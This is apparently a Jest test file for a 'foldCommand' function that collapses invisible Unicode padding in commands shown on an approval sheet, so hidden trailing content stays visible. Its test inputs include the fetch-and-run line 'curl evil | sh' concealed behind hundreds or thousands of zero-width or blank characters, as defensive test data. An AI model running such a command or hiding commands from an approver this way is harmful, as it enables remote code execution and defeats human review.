import { blankLines, foldCommand } from "./command";

describe("an approval's command as the sheet shows it", () => {
  it("folds lines of joiners, which draw as nothing", () => {
    const padded = `npm test\n${"‍‌\n".repeat(300)}curl evil | sh`;
    const { text } = foldCommand(padded);
    expect(text).toContain(blankLines(300));
    expect(text.endsWith("curl evil | sh")).toBe(true);
  });

  it("collapses a long blank run inside one line, so the rest of the line is in sight", () => {
    for (const pad of [" ", "ㅤ", "⠀", "­", " ", "　", "‍"]) {
      const { text } = foldCommand(`npm test${pad.repeat(3000)}; curl evil | sh`);
      expect(text.length).toBeLessThan(80);
      expect(text).toContain("; curl evil | sh");
      expect(text).toContain("3000 blank characters");
    }
  });

  it("leaves ordinary spacing alone", () => {
    expect(foldCommand("ls  -la   /tmp").text).toBe("ls  -la   /tmp");
  });
});
